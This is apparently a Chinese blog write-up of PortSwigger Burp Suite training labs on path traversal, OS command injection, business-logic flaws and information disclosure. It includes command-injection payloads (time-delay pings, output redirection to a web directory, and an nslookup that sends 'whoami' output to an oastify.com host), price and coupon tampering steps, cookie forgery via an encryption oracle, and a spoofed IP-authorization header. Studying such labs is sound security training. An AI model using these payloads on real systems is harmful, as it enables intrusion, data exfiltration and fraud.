<h3 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222182156488.png" alt="image-20230222182156488"></p>
<h3 id="固定路径前缀"><a href="#固定路径前缀" class="headerlink" title="固定路径前缀"></a>固定路径前缀</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222183231790.png" alt="image-20230222183231790"></p>
<h3 id="空字节截断路径绕过后缀控制"><a href="#空字节截断路径绕过后缀控制" class="headerlink" title="空字节截断路径绕过后缀控制"></a>空字节截断路径绕过后缀控制</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222183604008.png" alt="image-20230222183604008"></p>
<h2 id="防止目录遍历攻击"><a href="#防止目录遍历攻击" class="headerlink" title="防止目录遍历攻击"></a>防止目录遍历攻击</h2><p>最有效方法是完全避免将用户提供的输入传递给文件系统 API</p>
<h1 id="os命令注入"><a href="#os命令注入" class="headerlink" title="os命令注入"></a>os命令注入</h1><table>
<thead>
<tr>
<th align="left">Purpose of command</th>
<th align="left">Linux</th>
<th align="left">Windows</th>
</tr>
</thead>
<tbody><tr>
<td align="left">当前用户名</td>
<td align="left"><code>whoami</code></td>
<td align="left"><code>whoami</code></td>
</tr>
<tr>
<td align="left">操作系统</td>
<td align="left"><code>uname -a</code></td>
<td align="left"><code>ver</code></td>
</tr>
<tr>
<td align="left">网络配置</td>
<td align="left"><code>ifconfig</code></td>
<td align="left"><code>ipconfig /all</code></td>
</tr>
<tr>
<td align="left">网络连接</td>
<td align="left"><code>netstat -an</code></td>
<td align="left"><code>netstat -an</code></td>
</tr>
<tr>
<td align="left">运行进程</td>
<td align="left"><code>ps -ef</code></td>
<td align="left"><code>tasklist</code></td>
</tr>
</tbody></table>
<h3 id="简单案例-1"><a href="#简单案例-1" class="headerlink" title="简单案例"></a>简单案例</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222190009877.png" alt="image-20230222190009877"></p>
<p>从上图可以看到其实服务器端运行sh脚本来反馈存货量</p>
<p><code>|</code>命令执行并列符</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222185305147.png" alt="image-20230222185305147"></p>
<h2 id="OS命令盲注漏洞"><a href="#OS命令盲注漏洞" class="headerlink" title="OS命令盲注漏洞"></a>OS命令盲注漏洞</h2><p>OS命令盲注，与Sql盲注相同，都是不会在回显中直接获取到OS命令注入结果的，需要结合其他技术获取OS命令注入结果，我们看一下这样一个场景，该应用程序存在一个反馈功能可以发送邮件到管理员那里，我们看到后端会执行这样的命令<br><code>mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code><br> 我们看到后端使用的是mail命令，这个命令不会在响应中回显任何东西，这就导致我们无法直接从响应回显中看到命令注入结果，这时候就需要利用其他技术获取了</p>
<h3 id="利用延时检测OS命令盲注漏洞"><a href="#利用延时检测OS命令盲注漏洞" class="headerlink" title="利用延时检测OS命令盲注漏洞"></a>利用延时检测OS命令盲注漏洞</h3><p>例如以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp; ping -c 10 127.0.0.1 &amp; 2</span><br></pre></td></tr></table></figure>

<p>用于延时十秒</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222190701719.png" alt="image-20230222190701719"></p>
<h4 id="具有时间延迟的盲操作系统命令注入"><a href="#具有时间延迟的盲操作系统命令注入" class="headerlink" title="具有时间延迟的盲操作系统命令注入"></a>具有时间延迟的盲操作系统命令注入</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x|| ping -c 10 127.0.0.1 ||</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222192107446.png" alt="image-20230222192107446"></p>
<p><code>||</code>:左侧执行不了时执行右侧</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222192607951.png" alt="image-20230222192607951"></p>
<p>&amp;&amp;：左侧执行时再执行右侧</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222192649990.png" alt="image-20230222192649990"></p>
<p><code>|</code>: 可以认为执行右侧</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222192716156.png" alt="image-20230222192716156"></p>
<p>&amp; ：一起执行</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222190701719.png" alt="image-20230222190701719"></p>
<h4 id="通过重定向输出来利用盲操作系统命令注入"><a href="#通过重定向输出来利用盲操作系统命令注入" class="headerlink" title="通过重定向输出来利用盲操作系统命令注入"></a>通过重定向输出来利用盲操作系统命令注入</h4><p>利用重定向命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x || whoami &gt;&gt; /var/www/images/1 ||</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222194035228.png" alt="image-20230222194035228"></p>
<p>然后访问 <code>/images?filename=1</code></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222194026892.png" alt="image-20230222194026892"></p>
<h4 id="使用带外-OAST-技术利用盲操作系统命令注入"><a href="#使用带外-OAST-技术利用盲操作系统命令注入" class="headerlink" title="使用带外 (  OAST  ) 技术利用盲操作系统命令注入"></a>使用带外 ( <a target="_blank" rel="noopener" href="https://portswigger.net/burp/application-security-testing/oast"> OAST </a> ) 技术利用盲操作系统命令注入</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x || nslookup `whoami`.xgh78gzf4d7g8dz50dsngc5ft6zwnl.oastify.com ||</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222194759386.png" alt="image-20230222194759386"></p>
<h4 id="带外数据渗漏的盲目操作系统命令注入"><a href="#带外数据渗漏的盲目操作系统命令注入" class="headerlink" title="带外数据渗漏的盲目操作系统命令注入"></a>带外数据渗漏的盲目操作系统命令注入</h4><p>与上题相同  只是需要提交用户姓名</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222195436727.png" alt="image-20230222195436727"></p>
<h1 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h1><h2 id="过度信任客户端控制（支付）"><a href="#过度信任客户端控制（支付）" class="headerlink" title="过度信任客户端控制（支付）"></a>过度信任客户端控制（支付）</h2><p>在加入购物车时可以任意改动价格</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222215606476.png" alt="image-20230222215606476"></p>
<p>改动之后账户余额就够了<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222215633446.png" alt="image-20230222215633446"></p>
<h2 id="无法处理非常规输入"><a href="#无法处理非常规输入" class="headerlink" title="无法处理非常规输入"></a>无法处理非常规输入</h2><h4 id="利用负价格抵消"><a href="#利用负价格抵消" class="headerlink" title="利用负价格抵消"></a>利用负价格抵消</h4><p>我们发现可以提交负数量以得到负价格，但无法直接购买</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222221424982.png" alt="image-20230222221424982"></p>
<p>所以我们可以将几个商品正负相消，从而用我们的余额买到商品</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222221419075.png" alt="image-20230222221419075"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222221554642.png" alt="image-20230222221554642"></p>
<p>可以直接买入</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222221951844.png" alt="image-20230222221951844"></p>
<h4 id="数量溢出逻辑漏洞"><a href="#数量溢出逻辑漏洞" class="headerlink" title="数量溢出逻辑漏洞"></a>数量溢出逻辑漏洞</h4><p>通过测试发现一次加入购物车是99  加到最大是什么结果呢</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223183357803.png" alt="image-20230223183357803"></p>
<p>发现当到达一定数量  价格达到最大值  然后从负的最大值向零增加   这应该就是后端代码数值溢出了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223183239978.png" alt="image-20230223183239978"></p>
<p>然后最后再用其他的商品补充一下</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223184908058.png" alt="image-20230223184908058"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223184930770.png" alt="image-20230223184930770"></p>
<h4 id="对异常输入的处理不一致"><a href="#对异常输入的处理不一致" class="headerlink" title="对异常输入的处理不一致"></a>对异常输入的处理不一致</h4><p>第一反应是可不可以创建一个administrator的用户进行管理员覆盖  但是提示已经有了该用户</p>
<p>访问/admin尝试  <img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223191817474.png" alt="image-20230223191817474"></p>
<p>提示我们需要用这个公司用户进行登录  可能是截断  我们注册一个用户尝试</p>
<p>邮箱系统提示我们可以利用各种子域名邮箱进行注册 都能接收到验证邮件  利用长字段<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223191853191.png" alt="image-20230223191853191"></p>
<p>发现将我们的邮箱在255长度截断了  思路很明显了  就是利用子域名邮箱和截断 使我们的邮箱同时满足两个条件：</p>
<ol>
<li>邮箱系统子域名邮箱</li>
<li>@dontwannacry.com 也就是这个公司的用户</li>
</ol>
<p>构造一个满足的邮箱格式进行注册</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223192512930.png" alt="image-20230223192512930"></p>
<p>注册成功，并且获得权限</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223192606809.png" alt="image-20230223192606809"></p>
<p>删除carlos用户</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223192636835.png" alt="image-20230223192636835"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223192654598.png" alt="image-20230223192654598"></p>
<h2 id="对用户行为做出错误的假设"><a href="#对用户行为做出错误的假设" class="headerlink" title="对用户行为做出错误的假设"></a>对用户行为做出错误的假设</h2><h3 id="受信任的用户并不总是值得信赖"><a href="#受信任的用户并不总是值得信赖" class="headerlink" title="受信任的用户并不总是值得信赖"></a>受信任的用户并不总是值得信赖</h3><h3 id="不一致的安全控制"><a href="#不一致的安全控制" class="headerlink" title="不一致的安全控制"></a>不一致的安全控制</h3><p>允许任意用户访问本应仅供公司员工使用的管理功能</p>
<p>正常注册用户后修改邮箱  发现可以修改成功</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223194442330.png" alt="image-20230223194442330"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223194507457.png" alt="image-20230223194507457"></p>
<p>其实已经结束咯</p>
<p>漏洞产生的原因就是在注册成为用户之后 网站完全信任用户的输入而对邮箱没有之前的验证了  前后安全策略不一致</p>
<h3 id="用户填写可能不是必选项"><a href="#用户填写可能不是必选项" class="headerlink" title="用户填写可能不是必选项"></a>用户填写可能不是必选项</h3><p>探测逻辑缺陷时，您应该尝试依次删除每个参数并观察这对响应有何影响。  您应该确保：</p>
<ul>
<li>一次只删除一个参数以确保到达所有相关代码路径。</li>
<li>尝试删除参数的名称和值。  服务器通常会以不同方式处理这两种情况。</li>
<li>遵循多阶段流程直至完成。  有时，在一个步骤中篡改参数会影响工作流程中的另一个步骤。</li>
</ul>
<p>这适用于 URL 和 <code>POST</code>参数，但不要忘记也检查 cookie。  这个简单的过程可以揭示一些可能被利用的奇怪的应用程序行为。</p>
<h3 id="多用途的端点之间的弱隔离"><a href="#多用途的端点之间的弱隔离" class="headerlink" title="多用途的端点之间的弱隔离"></a>多用途的端点之间的弱隔离</h3><p>删除current-passwd参数</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223200141814.png" alt="image-20230223200141814"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223200235289.png" alt="image-20230223200235289"></p>
<p>结束</p>
<h2 id="用户不会总是遵循预期的顺序"><a href="#用户不会总是遵循预期的顺序" class="headerlink" title="用户不会总是遵循预期的顺序"></a>用户不会总是遵循预期的顺序</h2><h3 id="工作流程验证不足"><a href="#工作流程验证不足" class="headerlink" title="工作流程验证不足"></a>工作流程验证不足</h3><p>可以直接绕过检验  直接抓到清空回收站的包进行购买</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223213608906.png" alt="image-20230223213608906"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223213621621.png" alt="image-20230223213621621"></p>
<h3 id="通过有缺陷的状态机绕过身份验证"><a href="#通过有缺陷的状态机绕过身份验证" class="headerlink" title="通过有缺陷的状态机绕过身份验证"></a>通过有缺陷的状态机绕过身份验证</h3><p>直接将<code>/role-selector</code>页面的包丢掉  然后返回主页  发现已经是管理员权限了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223214701190.png" alt="image-20230223214701190"></p>
<h2 id="特定领域的缺陷"><a href="#特定领域的缺陷" class="headerlink" title="特定领域的缺陷"></a>特定领域的缺陷</h2><h3 id="有缺陷的业务规则执行"><a href="#有缺陷的业务规则执行" class="headerlink" title="有缺陷的业务规则执行"></a>有缺陷的业务规则执行</h3><p>有两个优惠</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223220939707.png" alt="image-20230223220939707"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223220923407.png" alt="image-20230223220923407"></p>
<p>发现将两张优惠券交替使用可以重复使用<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223221216514.png" alt="image-20230223221216514"></p>
<p>最终叠加成0</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223221816773.png" alt="image-20230223221816773"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230223221827173.png" alt="image-20230223221827173"></p>
<h3 id="无限金钱逻辑漏洞"><a href="#无限金钱逻辑漏洞" class="headerlink" title="无限金钱逻辑漏洞"></a>无限金钱逻辑漏洞</h3><p>领完优惠券之后我们7元就可以买到第二个商品：礼品卡，可以兑换10元  也就是可以白嫖3元  开始无限白嫖</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230224230929828.png" alt="image-20230224230929828"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230224231049996.png" alt="image-20230224231049996"></p>
<p>利用宏进行请求<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230224235741593.png" alt="image-20230224235741593"></p>
<p>访问<code>/my-account</code>  利用grep-exact匹配到相应字段</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230224235713531.png" alt="image-20230224235713531"></p>
<h2 id="提供加解密接口"><a href="#提供加解密接口" class="headerlink" title="提供加解密接口"></a>提供加解密接口</h2><h3 id="通过加密oracle绕过身份验证"><a href="#通过加密oracle绕过身份验证" class="headerlink" title="通过加密oracle绕过身份验证"></a>通过加密oracle绕过身份验证</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225115437327.png" alt="image-20230225115437327"></p>
<p>发现报错的时候会在响应里出现set-cookie字段，继续追踪重定向</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225120227927.png" alt="image-20230225120227927"></p>
<p>可以猜测这就是加解密点  从报错点响应加密 重定向之后解密从而回显到界面<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225125035088.png" alt="image-20230225125035088"></p>
<p>这个加解密点就可以利用于此站点其他具有加密的密文解密  可以尝试一下这个stay-logged-in令牌的解密</p>
<p>将<code>stay-logged-in</code>字段值替换<code>notification</code>值  可以发现解密成功</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225125337765.png" alt="image-20230225125337765"></p>
<p>这表明 cookie 应该采用以下格式 <code>username:timestamp</code> 使用了时间戳</p>
<p>将email参数改为<code>administrator:timestamp</code>形式</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225132918279.png" alt="image-20230225132918279"></p>
<p>解密发现 在我们的明文前自动加入了23位前缀<code>Invalid email address:administrator:</code></p>
<p><img src="/2023/02/18/burpsuite%E9%9D%B6%E5%9C%BA-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/Users/css/AppData/Roaming/Typora/typora-user-images/image-20230225133519324.png" alt="image-20230225133519324"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225134457765.png" alt="image-20230225134457765"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225134406051.png" alt="image-20230225134406051"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225134347415.png" alt="image-20230225134347415"></p>
<p>填充密码解密需要是16的倍数  </p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225135405096.png" alt="image-20230225135405096"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225140141073.png" alt="image-20230225140141073"></p>
<p>然后加上9位x我们一共删除32位</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225140659354.png" alt="image-20230225140659354"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225140720935.png" alt="image-20230225140720935"></p>
<p>直接访问<code>/admin</code> 删除session会话记录 要不会记录没登陆  然后替换我们构造的cookie<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225141743309.png" alt="image-20230225141743309"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225141849513.png" alt="image-20230225141849513"></p>
<h1 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h1><p>信息披露的一些基本示例如下：      </p>
<ul>
<li>揭示隐藏目录的名称、结构和内容 <code>robots.txt</code>文件或目录列表                      </li>
<li>通过临时备份提供对源代码文件的访问                        </li>
<li>在错误消息中明确提及数据库表名或列名          </li>
<li>不必要地暴露高度敏感的信息，例如信用卡详细信息                      </li>
<li>在源代码中硬编码 API 密钥、IP 地址、数据库凭据等          </li>
<li>通过应用程序行为的细微差别暗示资源、用户名等是否存在          </li>
</ul>
<h2 id="信息披露常见来源"><a href="#信息披露常见来源" class="headerlink" title="信息披露常见来源"></a>信息披露常见来源</h2><h3 id="网络爬虫文件"><a href="#网络爬虫文件" class="headerlink" title="网络爬虫文件"></a>网络爬虫文件</h3><ul>
<li><p>/robots.txt   </p>
</li>
<li><p>/sitemap.xml</p>
</li>
</ul>
<h3 id="目录列表"><a href="#目录列表" class="headerlink" title="目录列表"></a>目录列表</h3><p>不安全的访问控制</p>
<h3 id="开发者评论"><a href="#开发者评论" class="headerlink" title="开发者评论"></a>开发者评论</h3><p>内嵌HTML注释</p>
<h3 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h3><h4 id="错误消息中的信息泄露"><a href="#错误消息中的信息泄露" class="headerlink" title="错误消息中的信息泄露"></a>错误消息中的信息泄露</h4><p>泄露框架的版本号</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225160542435.png" alt="image-20230225160542435"></p>
<h3 id="调试数据"><a href="#调试数据" class="headerlink" title="调试数据"></a>调试数据</h3><p>用于开发环境的用于调试的错误信息和日志直接继承到生产环境中 </p>
<p>调试消息有时可能包含对发起攻击至关重要的信息，包括：</p>
<ul>
<li>可通过用户输入操作的关键会话变量的值</li>
<li>后端组件的主机名和凭据</li>
<li>服务器上的文件和目录名称</li>
<li>用于加密通过客户端传输的数据的密钥</li>
</ul>
<h4 id="调试页面信息泄露"><a href="#调试页面信息泄露" class="headerlink" title="调试页面信息泄露"></a>调试页面信息泄露</h4><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225161421692.png" alt="image-20230225161421692"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225161831359.png" alt="image-20230225161831359"></p>
<h3 id="用户账户页面"><a href="#用户账户页面" class="headerlink" title="用户账户页面"></a>用户账户页面</h3><p>访问控制和IDOR</p>
<h3 id="通过备份文件泄露源代码"><a href="#通过备份文件泄露源代码" class="headerlink" title="通过备份文件泄露源代码"></a>通过备份文件泄露源代码</h3><p>用于访问后端组件的 API 密钥和凭据</p>
<p>在某些情况下，您可以欺骗网站返回文件的内容。例如，文本编辑器经常在编辑原始文件时生成临时备份文件。这些临时文件通常以某种方式表示，例如通过附加波浪号 (<code>~</code>) 添加到文件名或添加不同的文件扩展名。使用备份文件扩展名请求代码文件有时可以让您在响应中读取文件的内容。</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225163146558.png" alt="image-20230225163146558"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225163330018.png" alt="image-20230225163214828"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225163414194.png" alt="image-20230225163414194"></p>
<h3 id="不安全配置导致信息泄露"><a href="#不安全配置导致信息泄露" class="headerlink" title="不安全配置导致信息泄露"></a>不安全配置导致信息泄露</h3><p>在其他情况下，开发人员可能会忘记在生产环境中禁用各种调试选项。例如，HTTP<code>TRACE</code>方法是为诊断目的而设计的。<code>TRACE</code>如果启用，Web 服务器将通过在响应中回显收到的确切请求来响应使用该方法的请求。这种行为通常是无害的，但偶尔会导致信息泄露，例如反向代理可能附加到请求中的内部身份验证标头的名称。</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225165035256.png" alt="image-20230225165035256"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225165052851.png" alt="image-20230225165052851"></p>
<p>最后通过代理 在包中加入</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Custom-IP-Authorization</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>

<p>被拒绝访问就在每个包中都加上</p>
<h3 id="版本控制历史"><a href="#版本控制历史" class="headerlink" title="版本控制历史"></a>版本控制历史</h3><h1 id="如何发现和利用信息泄露漏洞"><a href="#如何发现和利用信息泄露漏洞" class="headerlink" title="如何发现和利用信息泄露漏洞"></a>如何发现和利用信息泄露漏洞</h1><p>在本节中，我们将针对一些技术和工具提供实用建议，您可以使用这些技术和工具帮助识别各种情况下的信息披露。我们还提供了几个实验室，以便您可以练习提取不同类型的信息，这些信息可用作进一步攻击的一部分。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#how-to-test-for-information-disclosure-vulnerabilities">测试信息泄露漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#common-sources-of-information-disclosure">常见的信息披露来源</a> LABS</li>
</ul>
<h2 id="如何测试信息泄露漏洞"><a href="#如何测试信息泄露漏洞" class="headerlink" title="如何测试信息泄露漏洞"></a>如何测试信息泄露漏洞</h2><p>一般来说，重要的是不要在测试过程中形成“隧道视觉”。换句话说，您应该避免过于狭隘地关注特定漏洞。敏感数据可能会在各种地方泄露，因此重要的是不要错过任何以后可能有用的东西。在测试其他内容时，您经常会发现敏感数据。一项关键技能是能够随时随地识别有趣的信息。</p>
<p>以下是一些高级技术和工具的示例，您可以使用它们来帮助识别测试期间的信息泄露漏洞。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#fuzzing">模糊测试</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#using-burp-scanner">使用 Burp 扫描仪</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#using-burp-s-engagement-tools">使用 Burp 的参与工具</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#engineering-informative-responses">工程信息响应</a></li>
</ul>
<h2 id="信息披露的常见来源"><a href="#信息披露的常见来源" class="headerlink" title="信息披露的常见来源"></a>信息披露的常见来源</h2><p>信息披露可能发生在网站内的各种环境中。以下是一些常见的示例，您可以在这些地方查看是否暴露了敏感信息。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#files-for-web-crawlers">网络爬虫文件</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#directory-listings">目录列表</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#developer-comments">开发者评论</a> 实验室</li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#error-messages">错误消息</a> 实验室</li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#debugging-data">调试数据</a> 实验室</li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#user-account-pages">用户帐户页面</a> LABS</li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">备份文件</a> 实验室</li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#information-disclosure-due-to-insecure-configuration">不安全的配置</a> 实验室</li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting#version-control-history">版本控制历史</a> 实验室</li>
</ul>
<h3 id="网络爬虫文件-1"><a href="#网络爬虫文件-1" class="headerlink" title="网络爬虫文件"></a>网络爬虫文件</h3><p>许多网站提供文件<code>/robots.txt</code>并<code>/sitemap.xml</code>帮助爬虫浏览他们的网站。除其他外，这些文件通常会列出爬虫应该跳过的特定目录，例如，因为它们可能包含敏感信息。</p>
<p>由于这些文件通常不会从网站内部链接，因此它们可能不会立即出现在 Burp 的站点地图中。但是，值得尝试导航到<code>/robots.txt</code>或<code>/sitemap.xml</code>手动查看是否找到任何有用的东西。</p>
<h3 id="目录列表-1"><a href="#目录列表-1" class="headerlink" title="目录列表"></a>目录列表</h3><p>Web 服务器可以配置为自动列出没有索引页的目录的内容。这可以帮助攻击者快速识别给定路径上的资源，并直接继续分析和攻击这些资源。它特别增加了目录中不打算供用户访问的敏感文件的暴露程度，例如临时文件和故障转储。</p>
<p>目录列表本身不一定是安全漏洞。但是，如果网站也未能实施适当的访问控制，以这种方式泄露敏感资源的存在和位置显然是一个问题。</p>
<h3 id="开发者评论-1"><a href="#开发者评论-1" class="headerlink" title="开发者评论"></a>开发者评论</h3><p>在开发过程中，内联 HTML 注释有时会添加到标记中。在将更改部署到生产环境之前，通常会删除这些注释。但是，注释有时会被遗忘、遗漏，甚至故意留下，因为有人没有完全意识到安全隐患。尽管这些评论在呈现的页面上不可见，但可以使用 Burp 甚至浏览器的内置开发人员工具轻松访问它们。</p>
<p>有时，这些注释包含对攻击者有用的信息。例如，它们可能暗示隐藏目录的存在或提供有关应用程序逻辑的线索。</p>
<h3 id="错误信息-1"><a href="#错误信息-1" class="headerlink" title="错误信息"></a>错误信息</h3><p>信息泄露的最常见原因之一是冗长的错误消息。作为一般规则，您应该密切注意在审核期间遇到的所有错误消息。</p>
<p>错误消息的内容可以揭示有关给定参数预期的输入或数据类型的信息。这可以帮助您通过识别可利用的参数来缩小攻击范围。它甚至可以防止您浪费时间尝试注入根本不起作用的有效载荷。</p>
<p>详细的错误消息还可以提供有关网站使用的不同技术的信息。例如，他们可能会明确命名网站正在使用的模板引擎、数据库类型或服务器，及其版本号。此信息可能很有用，因为您可以轻松搜索此版本可能存在的任何已记录的漏洞利用。同样，您可以检查是否存在任何您可以利用的常见配置错误或危险的默认设置。其中一些可能会在官方文档中突出显示。</p>
<p>您可能还会发现该网站正在使用某种开源框架。在这种情况下，您可以研究公开可用的源代码，这是构建您自己的 exploit 的宝贵资源。</p>
<p>错误消息之间的差异还可以揭示幕后发生的不同应用程序行为。观察错误消息的差异是许多技术的一个重要方面，例如<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQL 注入</a>、<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/password-based#username-enumeration">用户名枚举</a>等。</p>
<p><strong>实验室</strong></p>
<p><strong>APPRENTICE</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages">错误消息中的信息泄露</a></p>
<p>未解决</p>
<h3 id="调试数据-1"><a href="#调试数据-1" class="headerlink" title="调试数据"></a>调试数据</h3><p>出于调试目的，许多网站生成自定义错误消息和日志，其中包含大量有关应用程序行为的信息。虽然此信息在开发过程中很有用，但如果在生产环境中泄露，它对攻击者也非常有用。</p>
<p>调试消息有时可能包含对发起攻击至关重要的信息，包括：</p>
<ul>
<li>可通过用户输入操作的关键会话变量的值</li>
<li>后端组件的主机名和凭据</li>
<li>服务器上的文件和目录名称</li>
